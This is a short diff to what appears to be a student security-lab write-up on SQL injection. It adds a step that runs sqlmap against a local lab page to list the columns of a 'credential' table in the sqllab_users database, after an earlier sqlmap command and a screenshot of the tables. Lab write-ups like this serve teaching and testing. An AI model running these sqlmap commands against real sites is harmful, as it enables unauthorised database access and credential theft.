@@ -84,3 +84,8 @@ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1" -D sqllab
 ``` 
 <img width="1000" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/tables.png?raw=true"><br>
 - We have a nameplate as credentials
+- Next we run the following command to view the fields in the table
+
+```sh
+ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1" -D sqllab_users -T credential --columns
+ ``` 
